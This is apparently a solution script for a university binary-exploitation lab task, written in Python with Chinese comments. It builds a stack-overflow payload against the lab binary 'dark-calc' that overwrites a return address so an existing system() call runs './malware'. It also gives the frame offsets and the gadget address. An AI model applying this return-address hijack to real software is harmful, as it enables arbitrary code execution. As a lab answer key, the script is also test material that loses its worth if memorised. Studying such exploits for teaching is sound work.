#!/usr/bin/env python3
"""Task 1 — 利用缓冲区漏洞执行 ./malware  (binary: attack/dark-calc)

实验文档要求：提交的 payload 必须使用“栈溢出”覆盖 input() 的返回地址，
使程序运行同目录下的 ./malware，输出
    You have successfully detonated the bomb! Congratulations!

栈帧 (input): expression 位于 rbp-0x10，返回地址偏移 = 16(buffer)+8(saved rbp) = 24。

思路（溢出改返回地址 -> 复用 eval 的 system 调用点）
----------------------------------------------------
input() 在 gets() 之后有 strcpy(command_buf, expression)，
所以只要输入以 "./malware\\0" 开头，command_buf 就等于 "./malware"。
再把返回地址改成 eval() 里这两条指令的地址：
    0x401a6b:  mov $0x6030d0,%edi     ; rdi = &command_buf
    0x401a70:  call system@plt        ; system(command_buf) = system("./malware")
input ret 后直接跳到 0x401a6b，于是以 command_buf 为参数调用 system，引爆炸弹。
（dark-calc 作为父进程经 system->sh fork 出 malware，满足其进程名自校验。）

布局:  [ "./malware\\0" + 填充 到 24B ][ 返回地址 = 0x401a6b ]
注意：不能含 0x0a(换行) 字节；本例无。
已验证（ASLR 开启，多次稳定）：输出 "successfully detonated the bomb"。
"""
import sys, struct

p  = b"./malware\x00"
p += b"A" * (24 - len(p))             # 垫满 buffer + saved rbp，到返回地址
p += struct.pack("<Q", 0x401a6b)      # 返回地址 -> eval 的 system(command_buf) 调用点

sys.stdout.buffer.write(p + b"\n")
